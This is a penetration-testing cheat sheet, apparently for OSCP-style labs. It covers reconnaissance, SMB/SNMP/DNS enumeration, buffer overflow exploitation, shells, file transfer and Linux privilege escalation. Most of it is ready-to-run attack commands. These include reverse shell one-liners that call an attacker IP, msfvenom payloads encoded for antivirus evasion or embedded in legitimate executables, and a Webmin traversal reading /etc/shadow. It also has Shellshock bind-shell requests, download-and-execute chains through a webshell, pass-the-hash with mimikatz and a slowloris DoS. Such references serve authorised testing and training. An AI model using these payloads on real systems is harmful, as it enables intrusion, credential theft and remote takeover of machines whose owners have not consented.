# Cheat Sheet

---

# Tools
## Wireshark

Show only SMTP (port 25) and ICMP traffic:
```
tcp.port eq 25 or icmp
```

Show only traffic in the LAN (192.168.x.x), between workstations and servers -- no Internet:
```
ip.src==192.168.0.0/16 and ip.dst==192.168.0.0/16
```

Filter by a protocol ( e.g. SIP ) and filter out unwanted IPs:
```
ip.src != xxx.xxx.xxx.xxx && ip.dst != xxx.xxx.xxx.xxx && sip
```

## Tcpdump

Display a pcap file
```bash
tcpdump -r passwordz.pcap
```

Display ips and filter and sort
```bash
tcpdump -n -r passwordz.pcap | awk -F" " '{print $3}' | sort -u | head
```

Grab a packet capture on port 80
```bash
tcpdump tcp port 80 -w output.pcap -i eth0
```

Check for ACK or PSH flag set in a TCP packet
```bash
tcpdump -A -n 'tcp[13] = 24' -r passwordz.pcap
```

## Dsniff
Display a pcap file with telnet protocol
```bash
dsniff -p ch2.pcap
```

## IPTables
Deny traffic to ports except for Local Loopback
```bash
iptables -A INPUT -p tcp --destination-port 13327 ! -d $ip -j DROP
iptables -A INPUT -p tcp --destination-port 9991 ! -d $ip -j DROP
```

Clear ALL IPTables firewall rules
```bash
iptables -P INPUT ACCEPT
iptables -P FORWARD ACCEPT
iptables -P OUTPUT ACCEPT
iptables -t nat -F
iptables -t mangle -F
iptables -F
iptables -X
iptables -t raw -F iptables -t raw -X
```

## Passive Information Gathering

### Google Hacking
Google search to find website sub domains
```
site:microsoft.com
```

Google filetype, and intitle
```
intitle:"netbotz appliance" "OK" -filetype:pdf
```

Google inurl
```
inurl:"level/15/sexec/-/show"
```

Google Hacking Database:
https://www.exploit-db.com/google-hacking-database/`

SSL Certificate Testing
https://www.ssllabs.com/ssltest/analyze.html

### Email Harvesting
Simply Email
```bash
git clone https://github.com/killswitch-GUI/SimplyEmail.git
./SimplyEmail.py -all -e TARGET-DOMAIN
```

### Active Information Gathering

Discover active IPs usign ARP on the network 
```bash
arp-scan $ip/24
```

Discover who else is on the network
```bash
netdiscover
```

Discover IP Mac and Mac vendors from ARP
```bash
netdiscover -r $ip/24
```

## Enumeration

### DNS Enumeration
NMAP DNS Hostnames Lookup
```bash
nmap -F --dns-server <dns server ip> <target ip range>
```

Host Lookup
```bash
host -t ns megacorpone.com
```

Host zone transfer
```bash
host -l target-dns-ip
```

Reverse Lookup Brute Force - find domains in the same range
```bash
for ip in $(seq 155 190);do host 50.7.67.$ip;done |grep -v "not found"
```

Perform DNS IP Lookup
```bash
dig a domain-name-here.com @nameserver
```

Perform MX Record Lookup
```bash
dig mx domain-name-here.com @nameserver
```

Perform Zone Transfer with DIG
```bash
dig axfr domain-name-here.com @nameserver
```

DNS Zone Transfers
Windows DNS zone transfer
```bash
nslookup -> set type=any -> ls -d blah.com
```
Linux DNS zone transfer
```bash
dig axfr blah.com @ns1.blah.com
```

Dnsrecon DNS Brute Force
```bash
dnsrecon -d TARGET -D /usr/share/wordlists/dnsmap.txt -t std --xml ouput.xml
```

Dnsrecon DNS List of megacorp
```bash
dnsrecon -d megacorpone.com -t axfr
```

DNSEnum
```bash
dnsenum zonetransfer.me
```


### NFS (Network File System) Enumeration

Show Mountable NFS Shares

```bash
nmap -sV --script=nfs-showmount $ip
```

### RPC (Remote Procedure Call) Enumeration
Connect to an RPC share without a username and password and enumerate privledges
```bash
rpcclient --user="" --command=enumprivs -N $ip
```

Connect to an RPC share with a username and enumerate privledges
```bash
rpcclient --user="<Username>" --command=enumprivs $ip
```

Dump rpc endpoints (impacket)
```bash
rpcdump.py username:password@target-ip
```

Lookup sid via rpc (impacket)
```bash
lookupsid.py username:password@target-ip
```

Once connected:
```
srvinfo # operating system version
lookupnames username
netshareenumall # enumerate all shares and its paths
enumdomusers # enumerate usernames defined on the server
getdompwinfo # smb password policy configured on the server
```

### SMB Enumeration
SMB OS Discovery
```bash
nmap $ip --script smb-os-discovery.nse
```

Nmap port scan
```bash
nmap -v -p 139,445 -oG smb.txt $ip-254
```

Netbios Information Scanning
```bash
nbtscan -r $ip/24
```

Nmap find exposed Netbios servers
```bash
nmap -sU --script nbstat.nse -p 137 $ip
```

Nmap all SMB scripts scan
```bash
nmap -sV -Pn -vv -p 445 --script='(smb*) and not (brute or broadcast or dos or external or fuzzer)' --script-args=unsafe=1 $ip
```

Nmap all SMB scripts authenticated scan
```bash
nmap -sV -Pn -vv -p 445 --script-args  smbuser=<username>,smbpass=<password> --script='(smb*) and  not (brute or broadcast or dos or external or fuzzer)'  --script-args=unsafe=1 $ip
```

SMB Enumeration Tools
```bash
nmblookup -A $ip
smbclient //MOUNT/share -I $ip -N
rpcclient -U "" $ip
enum4linux $ip
enum4linux -a $ip
```

SMB Finger Printing
```bash
smbclient -L //$ip
```

Nmap Scan for Open SMB Shares
```bash
nmap -T4 -v -oA shares --script smb-enum-shares --script-args smbuser=username,smbpass=password -p445 192.168.10.0/24
```

Nmap scans for vulnerable SMB Servers
```bash
nmap -v -p 445 --script=smb-check-vulns --script-args=unsafe=1 $ip
```

Nmap List all SMB scripts installed
```bash
ls -l /usr/share/nmap/scripts/smb*
```

Enumerate SMB Users
```bash
nmap -sU -sS --script=smb-enum-users -p U:137,T:139 $ip-14
python /usr/share/doc/python-impacket-doc/examples /samrdump.py $ip
```

RID Cycling - Null Sessions
```bash
ridenum.py $ip 500 50000 dict.txt
```

Manual Null Session Testing

Windows: 
```
net use \\$ip\IPC$ "" /u:""
```

Linux: 
```bash
smbclient -L //$ip
```

Impacket
```bash
/usr/share/doc/python3-impacket/examples/smbclient.py ""@192.168.24.24
```

SMBMap
```bash
smbmap -H 192.168.24.24
# Or having an user:
smbmap -u username -H 192.168.24.24
```

Generate a samba server with Impacket:

```bash
impacket-smbserver tools /home/kali/tools
impacket-smbserver -smb2support tools /home/kali/tools
```

Mounting it in Windows with Powershell:

```PowerShell
New-PSDrive -Name "tools" -PSProvider "Filesystem" -Root "\\192.168.42.42\tools"
```

```
net use z: \\192.168.42.42\tools"
```

On windows, to list mounted shares, either Powershell or without it:

```PowerShell
Get-SMBShare
```

```
net share
```

Mount in Linux

```bash
sudo apt-get install cifs-utils
sudo mount -t cifs //192.168.42.42/tools ~/my_share/
# To list mounted shares:
mount | grep cifs
grep cifs /proc/mount
```

Crackmapexec
```bash
crackmapexec -u 'guest' -p '' --shares 192.168.1.23
crackmapexec -u 'guest' -p '' --rid-brute 4000 192.168.1.23
crackmapexec -u 'guest' -p '' --users 192.168.1.23
crackmapexec smb 192.168.1.0/24 -u Administrator -p P@ssw0rd
crackmapexec smb 192.168.1.0/24 -u Administrator -H E52CAC67419A9A2238F10713B629B565:64F12CDDAA88057E06A81B54E73B949B
crackmapexec -u Administrator -H E52CAC67419A9A2238F10713B629B565:64F12CDDAA88057E06A81B54E73B949B -M mimikatz 192.168.1.
```

Download files
```bash
# Within smbclient, download everything recursively:
mask ""
recurse ON
prompt OFF
cd 'path\to\remote\dir'
lcd '~/path/to/download/to/'
mget *
```

### SMTP Enumeration - Mail Severs

POP3 Enumeration - Reading other peoples mail - You may find  usernames and passwords for email accounts, so here is how to check the  mail using Telnet

```bash
telnet $ip 110
+OK beta POP3 server (JAMES POP3 Server 2.3.2) ready 
USER billydean    
+OK
PASS password
+OK Welcome billydean

list

+OK 2 1807
1 786
2 1021

retr 1

+OK Message follows
From: jamesbrown@motown.com
Dear Billy Dean,

Here is your login for remote desktop ... try not to forget it this time!
username: billydean
password: PA$$W0RD!Z
```

Send mail via smtp
```bash
# connect
telnet $target-ip 25

# provide valid or fake email address
EHLO username@domain.tld

# set mail from
MAIL FROM: <username@domain>

# set receipient to 
RCPT TO: <target-username@target-domain.tld>

# set body and send mail
DATA
FROM: username@domain

Hello world
.
```

Download emails with curl
```bash
curl --insecure --url "imaps://domain/Draft;UID=4" --user "username:password"
```

### SNMP Enumeration -Simple Network Management Protocol

Fix SNMP output values so they are human readable
```bash
apt-get install snmp-mibs-downloader download-mibs echo "" > /etc/snmp/snmp.conf
```

SNMP Enumeration Commands
```bash
snmpcheck -t $ip -c public

snmpwalk -c public -v1 $ip 1| grep hrSWRunName|cut -d\* \* -f
snmpwalk -c private -v1 $ip
snmpwalk -c manager -v1 $ip

snmpwalk -c public -v1 $target-ip $OID

snmpenum -t $ip

onesixtyone -c names -i hosts
```

MIB OIDs:
```
1.3.6.1.2.1.25.1.6.0 - System Processes
1.3.6.1.2.1.25.4.2.1.2 - Running Programs
1.3.6.1.2.1.25.4.2.1.4 - Processes Path
1.3.6.1.2.1.25.2.3.1.4 - Storage Units
1.3.6.1.2.1.25.6.3.1.2 - Software Name
1.3.6.1.4.1.77.1.2.25 - User Accounts
1.3.6.1.2.1.6.13.1.3 - TCP Local Ports
```

SNMPv3 Enumeration
```bash
nmap -sV -p 161 --script=snmp-info $ip/24
```

Automate the username enumeration process for SNMPv3:
```bash
apt-get install snmp snmp-mibs-downloader wget https://raw.githubusercontent.com/raesene/TestingScripts/master/snmpv3enum.rb
```

SNMP Default Credentials
```bash
/usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt
```


### MS SQL Server Enumeration
Nmap Information Gathering
```bash
nmap -p 1433 --script  ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes  --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER $ip
```

MSSQL Xp_Cmdshell and Dumping

```
nmap -T4 -n -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=sa,mssql.password=abc,ms-sql-xp-cmdshell.cmd='whoami' 192.168.1.23 # command execution
nmap -T4 -n -p 1433 --script ms-sql-tables --script-args mssql.username=sa,mssql.password=abc 192.168.1.23 # dump tables information
nmap -T4 -n -p 1433 --script ms-sql-query --script-args mssql.username=sa,mssql.password=abc,mssql.database=bankdb,ms-sql-query.query="select * from tblCustomers;" 192.168.1.23 # sql query
```

### Webmin and miniserv/0.01 Enumeration - Port 10000

Test for LFI & file disclosure vulnerability by grabbing /etc/passwd
```bash
curl http://$ip:10000//unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/passwd
```
Test to see if webmin is running as root by grabbing /etc/shadow
```bash
curl http://$ip:10000//unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/shadow
```

### Linux OS Enumeration
List all SUID files
```bash
find / -perm -4000 2>/dev/null
```

Determine the current version of Linux
```bash
cat /etc/issue
```

Determine more information about the environment
```bash
uname -a
```

List processes running
```bash
ps -xaf
```

List the allowed (and forbidden) commands for the invoking use
```bash
sudo -l
```

List iptables rules
```bash
iptables --table nat --list iptables -vL -t filter iptables -vL -t  nat iptables -vL -t mangle iptables -vL -t raw iptables -vL -t security
```


### Windows OS Enumeration

```Batchfile
net config Workstation

systeminfo | findstr /B /C:"OS Name" /C:"OS Version"

hostname

net users

ipconfig /all

route print

arp -A

netstat -ano

netsh firewall show state

netsh firewall show config

schtasks /query /fo LIST /v

tasklist /SVC

net start

DRIVERQUERY

reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated

reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated

dir /s pass == cred == vnc == .config

findstr /si password *.xml *.ini *.txt

reg query HKLM /f password /t REG_SZ /s

reg query HKCU /f password /t REG_SZ /s
```

### Vulnerability Scanning with Nmap

Nmap Exploit Scripts

https://nmap.org/nsedoc/categories/exploit.html

Nmap search through vulnerability scripts
```bash
cd /usr/share/nmap/scripts/ ls -l *vuln*
```

Nmap search through Nmap Scripts for a specific keyword
```bash
ls /usr/share/nmap/scripts/* | grep ftp
```

Scan for vulnerable exploits with nmap
```bash
nmap --script exploit -Pn $ip
```

NMap Auth Scripts
```bash
https://nmap.org/nsedoc/categories/auth.html
```

Nmap Vuln Scanning
```bash
https://nmap.org/nsedoc/categories/vuln.html
```

NMap DOS Scanning

```bash
nmap --script dos -Pn $ip NMap Execute DOS Attack nmap  --max-parallelism 750 -Pn --script http-slowloris --script-args http-slowloris.runforever=true
```

Scan for coldfusion web vulnerabilities
```bash
nmap -v -p 80 --script=http-vuln-cve2010-2861 $ip
```

Anonymous FTP dump with Nmap
```bash
nmap -v -p 21 --script=ftp-anon.nse $ip-254
```

SMB Security mode scan with Nmap
```bash
nmap -v -p 21 --script=ftp-anon.nse $ip-254
```

### File Enumeration

Find UID 0 files root execution
```bash
/usr/bin/find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \\; 2>/dev/null
```

Get handy linux file system enumeration script (/var/tmp)
```bash
wget https://highon.coffee/downloads/linux-local-enum.sh chmod +x ./linux-local-enum.sh ./linux-local-enum.sh
```

Find executable files updated in August
```bash
find / -executable -type f 2> /dev/null | egrep -v "^/bin|^/var|^/etc|^/usr" | xargs ls -lh | grep Aug
```

Find a specific file on linux
```bash
find /. -name suid\*
```

### HTTP Enumeration
Search for folders with gobuster:

```bash
gobuster -w /usr/share/wordlists/dirb/common.txt -u $ip
```

```bash
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://192.168.24.24/FUZZ
```

Nikto
```bash
nikto -h $ip
nikto -C all -h $ip # scan all cgi directories
```

HTTP Enumeration with NMAP
```bash
nmap --script=http-enum -p80 -n $ip/24
```

Nmap Check the server methods
```bash
nmap --script http-methods --script-args http-methods.url-path='/test' $ip
```

Get Options available from web server curl -vX OPTIONS vm/test

Uniscan directory finder:
```bash
uniscan -qweds -u <http://vm/>
```

Wfuzz - The web brute forcer

```bash
wfuzz -c -w /usr/share/wfuzz/wordlist/general/megabeast.txt $ip:60080/?FUZZ=test
wfuzz -c --hw 114 -w /usr/share/wfuzz/wordlist/general/megabeast.txt $ip:60080/?page=FUZZ
wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt "$ip:60080/?page=mailer&mail=FUZZ"
wfuzz -c -w /usr/share/seclists/Discovery/Web_Content/common.txt --hc 404 $ip/FUZZ
# Recurse level 3
wfuzz -c -w /usr/share/seclists/Discovery/Web_Content/common.txt -R 3 --sc 200 $ip/FUZZ

# post data (login)
wfuzz -u $ip/index.php -d 'username=admin&password=FUZZ' -w /usr/share/wordlist/rockyou.txt
```

Open a service using a port knock (Secured with Knockd)
```bash
for x in 7000 8000 9000; do nmap -Pn --host_timeout 201 --max-retries 0 -p $x server_ip_address; done
```

WordPress Scan - Wordpress security scanner
```bash
wpscan --url $ip/blog --proxy $ip:3129 --enumerate ap,at,u --detection-mode aggressive # all plugins, themes, users
```

RSH Enumeration - Unencrypted file transfer system
```
auxiliary/scanner/rservices/rsh_login
```

### Finger Enumeration

finger @$ip
```bash
finger batman@$ip
```

### LDAP enumeration

ldapsearch
```bash
ldapsearch -x -h $target-ip -b "dc=domain,dc=tld"
```

windapsearch.py
```bash
./windapsearch.py -d host.domain.tld -u domain\\ldapbind -p password -U
```

### TLS & SSL Testing
```bash
./testssl.sh -e -E -f -p -y -Y -S -P -c -H -U $ip | aha > OUTPUT-FILE.html
```

Proxy Enumeration (useful for open proxies)

```bash
nikto -useproxy http://$ip:3128 -h $ip
```

### Steganography

```bash
apt-get install steghide
steghide extract -sf picture.jpg
steghide info picture.jpg

apt-get install stegosuite
```

### The OpenVAS Vulnerability Scanner
```bash

apt-get update
apt-get install openvas
openvas-setup
netstat -tulpn

# Login at:
https://$ip:9392
```

## Buffer Overflows and Exploits
DEP and ASLR - Data Execution Prevention (DEP) and Address Space Layout Randomization (ASLR)

Nmap Fuzzers:
NMap Fuzzer List
https://nmap.org/nsedoc/categories/fuzzer.html

NMap HTTP Form Fuzzer
```bash
nmap --script http-form-fuzzer --script-args 'http-form-fuzzer.targets={1={path=/},2={path=/register.html}}' -p 80 $ip
```

Nmap DNS Fuzzer
```bash
nmap --script dns-fuzz --script-args timelimit=2h $ip -d
```


Windows Buffer Overflows
Controlling EIP
```bash
locate msf-pattern_create
msf-pattern_create -l 2700
locate msf-pattern_offset
msf-pattern_offset -q 39694438
```

Verify exact location of EIP - Exact match at offset 2606
```python
buffer = "A" * 2606 + "B" * 4 + "C" * 90
```

Check for “Bad Characters” - Run multiple times 0x00 - 0xFF

Use Mona to determine a module that is unprotected

Bypass DEP if present by finding a Memory Location with Read and Execute access for JMP ESP

Use NASM to determine the HEX code for a JMP ESP instruction
```bash
/usr/bin/msf-nasm_shell
```

JMP ESP
```Assembly
00000000 FFE4 jmp esp
```

Run Mona in immunity log window to find (FFE4) XEF command
```
!mona find -s "\xff\xe4" -m slmfc.dll
found at 0x5f4a358f - Flip around for little endian format
buffer = "A" * 2606 + "\x8f\x35\x4a\x5f" + "C" * 390
```

MSFVenom to create payload
msfvenom -p windows/shell_reverse_tcp LHOST=$ip LPORT=443 -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d"

Final Payload with NOP slide
```python
buffer="A"*2606 + "\x8f\x35\x4a\x5f" + "\x90" * 8 + shellcode
```

Create a PE Reverse Shell
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=$ip LPORT=4444 -f exe -o shell_reverse.exe
```

Create a PE Reverse Shell and Encode 9 times with Shikata_ga_nai
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=$ip LPORT=4444 -f exe -e x86/shikata_ga_nai -i 9 -o shell_reverse_msf_encoded.exe
```

Create a PE reverse shell and embed it into an existing executable
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=$ip LPORT=4444 -f exe -e  x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o  shell_reverse_msf_encoded_embedded.exe
```

Create a PE Reverse HTTPS shell
```bash
msfvenom -p windows/meterpreter/reverse_https LHOST=$ip LPORT=443 -f exe -o met_https_reverse.exe
```


Linux Buffer Overflows
Run Evans Debugger against an app
```bash
edb --run /usr/games/crossfire/bin/crossfire
```

ESP register points toward the end of our CBuffer
```Assembly
add eax,12
jmp eax
83C00C add eax,byte +0xc
FFE0 jmp eax
```

Check for “Bad Characters” Process of elimination - Run multiple times 0x00 - 0xFF

Find JMP ESP address
```
"\x97\x45\x13\x08" # Found at Address 08134597
```

crash = "\x41" * 4368 + "\x97\x45\x13\x08" + "\x83\xc0\x0c\xff\xe0\x90\x90"

msfvenom -p linux/x86/shell_bind_tcp LPORT=4444 -f c -b "\x00\x0a\x0d\x20" -e x86/shikata_ga_nai

Connect to the shell with netcat:
```bash
nc -v $ip 4444
```


## Shells

Spawning a TTY Shell - Break out of Jail or limited shell You should  almost always upgrade your shell after taking control of an apache or  www user.
(For example when you encounter an error message when trying to run an exploit sh: no job control in this shell )

```bash
ssh user@$ip nc $localip 4444 -e /bin/sh
enter user's password

python -c 'import pty; pty.spawn("/bin/sh")'
export TERM=xterm
stty rows 36 cols 179
```

### Reverse shells

```php
<?php $sock = fsockopen("192.168.42.42","443"); $proc = proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes); ?>

php -r '$sock=fsockopen("192.168.42.42",443);exec("/bin/sh -i <&3 >&3 2>&3");'
```

```bash
bash -i >& /dev/tcp/192.168.42.42/443 0>&1
```

Netcat
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.42.42 443 >/tmp/f
```

Perl (example deploy as cgi-bin)
```bash
msfvenom -p cmd/unix/reverse_perl LHOST="192.168.42.42" LPORT=443 -f raw -o reverse_shell.cgi
```

Java (example to deploy on tomcat)
```bash
msfvenom -p java/shell_reverse_tcp LHOST="192.168.42.42" LPORT=443 -f war rev_shell.war
```

Windows HTTP download reverse shell
```bash
msfvenom -a x86 --platform windows -p windows/exec CMD="powershell \"IEX(New-Object Net.WebClient).downloadString('http://192.168.42.42/Invoke-PowerShellTcp.ps1')\"" -e x86/unicode_mixed BufferRegister=EAX -f python
```

Windows stageless reverse TCP
```bash
msfvenom -p windows/shell_reverse_tcp EXITFUNC=thread LHOST=192.168.42.42 LPORT=443 -f exe -o <output_name.format>
```

Linux stageless reverse TCP
```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.42.42 LPORT=443 -f elf -o <outout_name>.elf
```

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$ip",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

Break out of restricted shell
```bash
echo os.system('/bin/bash')
/bin/sh -i

# perl: 
perl -e 'exec "/bin/sh";'
exec "/bin/sh";

# ruby: 
exec "/bin/sh"

# lua: 
os.execute('/bin/sh')

# From within IRB: 
exec "/bin/sh"

# From within vi: 
:!bash
:set shell=/bin/bash:shell

# From within vim
:!bash

# From within nmap: 
!sh

# From within tcpdump
echo $'id\n/bin/netcat $ip 443 -e /bin/bash' > /tmp/.test chmod +x /tmp/.test sudo tcpdump -ln -I eth- -w /dev/null -W 1 -G 1 -z /tmp/.tst -Z root

# From busybox 
/bin/busybox telnetd -|/bin/sh -p9999
```

Pen test monkey PHP reverse shell
http://pentestmonkey.net/tools/web-shells/php-reverse-shel

php-findsock-shell - turns PHP port 80 into an interactive shell
http://pentestmonkey.net/tools/web-shells/php-findsock-shell

Perl Reverse Shell
http://pentestmonkey.net/tools/web-shells/perl-reverse-shell

PHP powered web browser Shell b374k with file upload etc.
https://github.com/b374k/b374k

Windows reverse shell - PowerSploit’s Invoke-Shellcode script and inject a Meterpreter shell
https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-Shellcode.ps1

Web Backdoors from Fuzzdb
https://github.com/fuzzdb-project/fuzzdb/tree/master/web-backdoors

Handlers Metasploit handlers can be great at quickly  setting up Metasploit to be in a position to receive your incoming  shells. Handlers should be in the following format.
```
use exploit/multi/handler
set PAYLOAD <Payload name>
set LHOST <LHOST value>
set LPORT <LPORT value>
set ExitOnSession false
exploit -j -z
```

Once the required values are completed the following command will execute your handler - ‘msfconsole -L -r ‘

SBD.exe
sbd is a Netcat-clone, designed to be portable and offer strong  encryption. It runs on Unix-like operating systems and on Microsoft  Win32. sbd features AES-CBC-128 + HMAC-SHA1 encryption (by Christophe  Devine), program execution (-e option), choosing source port, continuous  reconnection with delay, and some other nice features. sbd supports  TCP/IP communication only. sbd.exe (part of the Kali linux distribution:  /usr/share/windows-binaries/backdoors/sbd.exe) can be uploaded to a  windows box as a Netcat alternative.


### Injected shells

Python injected shells
```python
__builtins__.__import__('os').system('/bin/bash -i')
```

### Evil-WinRM

Get shell via Evil-WinRM (http port 5985)
```bash
./evil-winrm.rb -u username -p password -i $target-ip
```

## Shellshock
Testing for shell shock with NMap

```bash
nmap -sV -p 80 --script http-shellshock --script-args uri=/cgi-bin/admin.cgi $ip
```

```bash
git clone https://github.com/nccgroup/shocker
./shocker.py -H TARGET --command "/bin/cat /etc/passwd" -c /cgi-bin/status --verbose
```

Shell Shock SSH Forced Command
Check for forced command by enabling all debug output with ssh
```bash
ssh -vvv
ssh -i noob noob@$ip '() { :;}; /bin/bash'
```

cat file (view file contents)
```bash
echo -e "HEAD /cgi-bin/status HTTP/1.1\\r\\nUser-Agent: () {:;}; echo \\$(</etc/passwd)\\r\\nHost:vulnerable\\r\\nConnection: close\\r\\n\\r\\n" | nc TARGET 80
```

Shell Shock run bind shell
```bash
echo -e "HEAD /cgi-bin/status HTTP/1.1\\r\\nUser-Agent: () {:;}; /usr/bin/nc -l -p 9999 -e /bin/sh\\r\\nHost:vulnerable\\r\\nConnection: close\\r\\n\\r\\n" | nc TARGET 80
```

## File Transfers
Post exploitation refers to the actions performed by an attacker, once some level of control has been gained on his target.

Simple Local Web Servers
Run a basic http server, great for serving up shells etc
```bash
python -m SimpleHTTPServer
python3 -m http.server
python3 -m http.server -d /home/kali/Desktop/share

ruby -rwebrick -e "WEBrick::HTTPServer.new (:Port => 80, :DocumentRoot => Dir.pwd).start"

php -S $ip:80
```

Creating a wget VB Script on Windows:
https://github.com/erik1o6/oscp/blob/master/wget-vbs-win.txt

Windows file transfer script that can be pasted to the command line.  File transfers to a Windows machine can be tricky without a Meterpreter  shell. The following script can be copied and pasted into a basic  windows reverse and used to transfer files from a web server (the  timeout 1 commands are required after each new line):
```Batchfile
echo Set args = Wscript.Arguments  >> webdl.vbs
timeout 1
echo Url = "http://1.1.1.1/windows-privesc-check2.exe"  >> webdl.vbs
timeout 1
echo dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")  >> webdl.vbs
timeout 1
echo dim bStrm: Set bStrm = createobject("Adodb.Stream")  >> webdl.vbs
timeout 1
echo xHttp.Open "GET", Url, False  >> webdl.vbs
timeout 1
echo xHttp.Send  >> webdl.vbs
timeout 1
echo with bStrm      >> webdl.vbs
timeout 1
echo   .type = 1 '      >> webdl.vbs
timeout 1
echo   .open      >> webdl.vbs
timeout 1
echo   .write xHttp.responseBody      >> webdl.vbs
timeout 1
echo   .savetofile "C:\temp\windows-privesc-check2.exe", 2 '  >> webdl.vbs
timeout 1
echo end with >> webdl.vbs
timeout 1
echo
```

The file can be run using the following syntax:
```Batchfile
cscript.exe webdl.vbs
```

## Downloading Files

Windows
```
iex(new-object net.webclient).downloadstring("http://192.168.42.42/evil.ps1)
certutil.exe -urlcache -split -f "http://192.168.42.42/nc.exe" nc.exe
IWR -Uri "http://192.168.42.42/n64.exe" -Outfile "n64.exe"
```

Linux
```bash
curl http://192.168.42.42/evil.php -o /tmp/evil.php
wget http://192.168.42.42/evil.php -O /tmp/evil.php
```

HTTP Put
```bash
nmap -p80 $ip --script http-put --script-args http-put.url='/test/sicpwn.php',http-put.file='/var/www/html/sicpwn.php
```

Socket transfer
```bash
# Attacker:
nc -lvnp 443 < evil.php

# Victim:
nc -v 192.168.42.42 443 > evil.php
```

RDP
```bash
rdesktop -g 1600x800 -r disk:tmp=/usr/share/windows-binaries 192.168.30.30 -u user -p -
```

## Uploading Files
SCP

```bash
scp username1@source_host:directory1/filename1 username2@destination_host:directory2/filename2
scp localfile username@$ip:~/Folder/
scp Linux_Exploit_Suggester.pl bob@192.168.1.10:~
```

Webdav with Davtest - Some sysadmins are kind enough to enable the PUT method - This tool will auto upload a backdoor
```bash
davtest -move -sendbd auto -url http://$ip
```
https://github.com/cldrn/davtest

You can also upload a file using the PUT method with the curl command:
```bash
curl -T 'leetshellz.txt' 'http://$ip'
```

And rename it to an executable file using the MOVE method with the curl command:
```bash
curl -X MOVE --header 'Destination:http://$ip/leetshellz.php' 'http://$ip/leetshellz.txt'
```

Upload shell using limited php shell cmd
use the webshell to download and execute the meterpreter
```bash
curl -s --data "cmd=wget http://174.0.42.42:8000/dhn -O /tmp/evil" http://$ip/files/sh.php
curl -s --data "cmd=chmod 777 /tmp/evil" http://$ip/files/sh.php
curl -s --data "cmd=bash -c /tmp/evil" http://$ip/files/sh.php
```

TFTP
```bash
mkdir /tftp
atftpd --daemon --port 69 /tftp
cp /usr/share/windows-binaries/nc.exe /tftp/

# EX. FROM WINDOWS HOST:
C:\Users\Offsec>tftp -i $ip get nc.exe
```

FTP

```bash
apt-get update && apt-get install pure-ftpd
```

```bash
#!/bin/bash
groupadd ftpgroup
useradd -g ftpgroup -d /dev/null -s /etc ftpuser
pure-pw useradd offsec -u ftpuser -d /ftphome
pure-pw mkdb
cd /etc/pure-ftpd/auth/
ln -s ../conf/PureDB 60pdb
mkdir -p /ftphome
chown -R ftpuser:ftpgroup /ftphome/
/etc/init.d/pure-ftpd restart
```

## Packing Files
Ultimate Packer for eXecutables

```bash
upx -9 nc.exe
```

exe2bat - Converts EXE to a text file that can be copied and pasted
```bash
locate exe2bat
wine exe2bat.exe nc.exe nc.txt
```

Veil - Evasion Framework - https://github.com/Veil-Framework/Veil-Evasion
```bash
apt-get -y install git
git clone https://github.com/Veil-Framework/Veil-Evasion.git
cd Veil-Evasion/
cd setup
setup.sh -c
```

## Privilege Escalation
Password reuse is your friend. The OSCP labs are true to life, in the way that the users will reuse passwords across different services and even different boxes. Maintain a list of cracked passwords and test them on new machines you encounter.


### Linux Privilege Escalation

Defacto Linux Privilege Escalation Guide - A much more through guide for linux enumeration:
https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/

Try the obvious - Maybe the user is root or can sudo to root:
```bash
id
sudo su
```

Which users can login to this box (Do they use thier username as their password)?:
```bash
grep -vE "nologin|false" /etc/passwd
```

What kernel version are we using? Do we have any kernel exploits for this version?
```bash
uname -a
searchsploit linux kernel 3.2 --exclude="(PoC)|/dos/"
```

What applications have active connections?:
```bash
netstat -tulpn
```

What services are running as root?:
```bash
ps aux | grep root
```

What files run as root / SUID / GUID?:
```bash
find / -perm +2000 -user root -type f -print

# Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.
find / -perm -1000 -type d 2>/dev/null

# SGID (chmod 2000) - run as the group, not the user who started it.
find / -perm -g=s -type f 2>/dev/null

# SUID (chmod 4000) - run as the owner, not the user who started it.
find / -perm -u=s -type f 2>/dev/null

# SGID or SUID
find / -perm -g=s -o -perm -u=s -type f 2>/dev/null

for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done

